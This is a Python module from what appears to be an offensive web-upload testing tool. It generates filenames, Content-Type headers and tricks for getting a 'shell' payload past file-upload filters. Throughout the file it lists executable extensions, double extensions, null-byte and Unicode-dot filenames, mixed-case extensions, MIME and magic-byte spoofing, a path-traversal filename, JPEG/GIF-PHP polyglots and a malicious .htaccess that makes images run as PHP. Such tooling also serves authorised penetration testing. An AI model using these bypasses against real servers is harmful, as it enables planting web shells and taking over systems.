"""
bypass_techniques.py — 20+ File Upload Bypass Techniques
Covers extension obfuscation, MIME spoofing, null bytes, polyglots, and more.
"""

import os
import copy
import itertools
from typing import List, Dict, Any


class BypassTechniques:
    """Generate a list of bypass attempts for file upload endpoints."""

    # Maps payload type → dangerous extensions the server might execute
    DANGEROUS_EXTENSIONS = {
        "php": ["php", "php2", "php3", "php4", "php5", "php7", "phtml", "pht", "phps", "phar"],
        "asp": ["asp", "aspx", "asa", "cer", "ashx", "asmx", "soap"],
        "jsp": ["jsp", "jspa", "jsw", "jsv", "jspx", "wss", "do", "action"],
        "cf":  ["cfm", "cfml", "cfc"],
        "pl":  ["pl", "cgi"],
    }

    SAFE_EXTENSIONS = ["jpg", "jpeg", "png", "gif", "bmp", "svg", "ico",
                       "txt", "pdf", "zip", "doc", "docx", "xml"]

    MIME_TYPES = {
        # Legitimate image MIME types used for spoofing
        "image/jpeg": "jpg",
        "image/png":  "png",
        "image/gif":  "gif",
        "image/bmp":  "bmp",
        "image/svg+xml": "svg",
        "text/plain": "txt",
        "application/octet-stream": "bin",
        # Actual content types
        "application/x-php": "php",
        "text/x-php": "php",
    }

    def __init__(self, payload_type: str = "php", base_filename: str = "shell"):
        self.payload_type = payload_type.lower()
        self.base_filename = base_filename
        self.dangerous_exts = self.DANGEROUS_EXTENSIONS.get(self.payload_type, ["php"])

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def generate_all(self) -> List[Dict[str, Any]]:
        """Return every bypass attempt as a list of dicts."""
        attempts = []
        attempts += self._extension_bypass()
        attempts += self._double_extension_bypass()
        attempts += self._null_byte_bypass()
        attempts += self._case_variation_bypass()
        attempts += self._mime_type_bypass()
        attempts += self._content_type_spoof()
        attempts += self._magic_bytes_bypass()
        attempts += self._htaccess_bypass()
        attempts += self._special_char_bypass()
        attempts += self._polyglot_bypass()
        return attempts

    def generate_quick(self) -> List[Dict[str, Any]]:
        """Faster subset — most commonly successful techniques."""
        attempts = []
        attempts += self._extension_bypass()
        attempts += self._double_extension_bypass()
        attempts += self._mime_type_bypass()
        attempts += self._null_byte_bypass()
        return attempts

    # ------------------------------------------------------------------ #
    #  Technique implementations                                           #
    # ------------------------------------------------------------------ #

    def _extension_bypass(self) -> List[Dict[str, Any]]:
        """Try every dangerous extension directly."""
        attempts = []
        for ext in self.dangerous_exts:
            filename = f"{self.base_filename}.{ext}"
            attempts.append({
                "technique": "direct_extension",
                "filename": filename,
                "content_type": "application/octet-stream",
                "description": f"Direct upload with .{ext} extension",
            })
        return attempts

    def _double_extension_bypass(self) -> List[Dict[str, Any]]:
        """Append a safe extension after the dangerous one (e.g. shell.php.jpg)."""
        attempts = []
        for d_ext in self.dangerous_exts:
            for s_ext in ["jpg", "png", "gif", "txt"]:
                filename = f"{self.base_filename}.{d_ext}.{s_ext}"
                attempts.append({
                    "technique": "double_extension",
                    "filename": filename,
                    "content_type": f"image/{s_ext}" if s_ext != "txt" else "text/plain",
                    "description": f"Double extension bypass: .{d_ext}.{s_ext}",
                })
                # Also try reversed (safe first)
                filename_rev = f"{self.base_filename}.{s_ext}.{d_ext}"
                attempts.append({
                    "technique": "double_extension_reversed",
                    "filename": filename_rev,
                    "content_type": f"image/{s_ext}" if s_ext != "txt" else "text/plain",
                    "description": f"Reversed double extension: .{s_ext}.{d_ext}",
                })
        return attempts

    def _null_byte_bypass(self) -> List[Dict[str, Any]]:
        """Inject null byte to truncate server-side filename parsing."""
        attempts = []
        for d_ext in self.dangerous_exts:
            for s_ext in ["jpg", "png"]:
                # URL-encoded null byte
                filename = f"{self.base_filename}.{d_ext}%00.{s_ext}"
                attempts.append({
                    "technique": "null_byte",
                    "filename": filename,
                    "content_type": f"image/{s_ext}",
                    "description": f"Null byte truncation: .{d_ext}%00.{s_ext}",
                })
                # Raw null byte (some frameworks handle differently)
                filename_raw = f"{self.base_filename}.{d_ext}\x00.{s_ext}"
                attempts.append({
                    "technique": "null_byte_raw",
                    "filename": filename_raw,
                    "content_type": f"image/{s_ext}",
                    "description": f"Raw null byte bypass for .{d_ext}",
                })
        return attempts

    def _case_variation_bypass(self) -> List[Dict[str, Any]]:
        """Mixed-case extensions to evade blocklist checks."""
        attempts = []
        for ext in self.dangerous_exts:
            variations = set()
            # Generate several case combos without brute-forcing all 2^n
            variations.add(ext.upper())
            variations.add(ext.capitalize())
            # Alternate case: pHp, PhP …
            for combo in itertools.islice(
                itertools.product(*[[c.lower(), c.upper()] for c in ext]), 8
            ):
                variations.add("".join(combo))
            for var in variations:
                if var == ext:
                    continue
                filename = f"{self.base_filename}.{var}"
                attempts.append({
                    "technique": "case_variation",
                    "filename": filename,
                    "content_type": "application/octet-stream",
                    "description": f"Case variation bypass: .{var}",
                })
        return attempts

    def _mime_type_bypass(self) -> List[Dict[str, Any]]:
        """Send a dangerous file but claim a safe MIME type in Content-Type."""
        attempts = []
        safe_mimes = {
            "image/jpeg": "jpg",
            "image/png": "png",
            "image/gif": "gif",
            "text/plain": "txt",
        }
        for d_ext in self.dangerous_exts[:3]:   # Limit combinations
            filename = f"{self.base_filename}.{d_ext}"
            for mime, safe_ext in safe_mimes.items():
                attempts.append({
                    "technique": "mime_type_spoof",
                    "filename": filename,
                    "content_type": mime,
                    "description": f"MIME spoof: .{d_ext} claimed as {mime}",
                })
        return attempts

    def _content_type_spoof(self) -> List[Dict[str, Any]]:
        """Swap filename extension to safe but keep payload content."""
        attempts = []
        for s_ext in ["jpg", "png", "gif"]:
            filename = f"{self.base_filename}.{s_ext}"
            attempts.append({
                "technique": "extension_spoof",
                "filename": filename,
                "content_type": f"image/{s_ext}",
                "description": f"Extension spoof: PHP payload renamed to .{s_ext}",
                "note": "Content is still executable payload — tests server-side validation",
            })
        return attempts

    def _magic_bytes_bypass(self) -> List[Dict[str, Any]]:
        """Prepend legitimate magic bytes (file signature) before the payload."""
        # These are prepended in payload_generator; here we just flag the technique
        magic_map = {
            "jpg":  b"\xff\xd8\xff\xe0",
            "png":  b"\x89PNG\r\n\x1a\n",
            "gif":  b"GIF89a",
            "pdf":  b"%PDF-1.4",
        }
        attempts = []
        for d_ext in self.dangerous_exts[:2]:
            for img_type, magic in magic_map.items():
                filename = f"{self.base_filename}.{d_ext}"
                attempts.append({
                    "technique": "magic_bytes",
                    "filename": filename,
                    "content_type": f"image/{img_type}",
                    "description": f"Magic bytes prepend ({img_type}) + .{d_ext} extension",
                    "magic_bytes": magic,
                })
        return attempts

    def _htaccess_bypass(self) -> List[Dict[str, Any]]:
        """Upload a malicious .htaccess to make the server execute .jpg files."""
        return [
            {
                "technique": "htaccess_upload",
                "filename": ".htaccess",
                "content_type": "text/plain",
                "description": "Upload .htaccess to redefine handler for safe extensions",
                "payload_override": b"AddType application/x-httpd-php .jpg .png .gif\n",
            }
        ]

    def _special_char_bypass(self) -> List[Dict[str, Any]]:
        """Use special characters in filename that some parsers mishandle."""
        attempts = []
        specials = [
            ("trailing_dot",  f"{self.base_filename}.php."),
            ("trailing_space", f"{self.base_filename}.php "),
            ("semicolon",      f"{self.base_filename}.php;.jpg"),
            ("unicode_dot",    f"{self.base_filename}.php\u2024jpg"),  # One-dot leader
            ("path_traversal", f"../uploads/{self.base_filename}.php"),
        ]
        for name, filename in specials:
            attempts.append({
                "technique": f"special_char_{name}",
                "filename": filename,
                "content_type": "application/octet-stream",
                "description": f"Special character bypass: {name}",
            })
        return attempts

    def _polyglot_bypass(self) -> List[Dict[str, Any]]:
        """Files that are simultaneously valid in two formats (e.g. JPEG + PHP)."""
        return [
            {
                "technique": "polyglot_jpeg_php",
                "filename": f"{self.base_filename}.php",
                "content_type": "image/jpeg",
                "description": "Polyglot: valid JPEG header containing PHP code",
                "is_polyglot": True,
            },
            {
                "technique": "polyglot_gif_php",
                "filename": f"{self.base_filename}.php",
                "content_type": "image/gif",
                "description": "Polyglot: GIF89a header + PHP payload",
                "is_polyglot": True,
            },
        ]
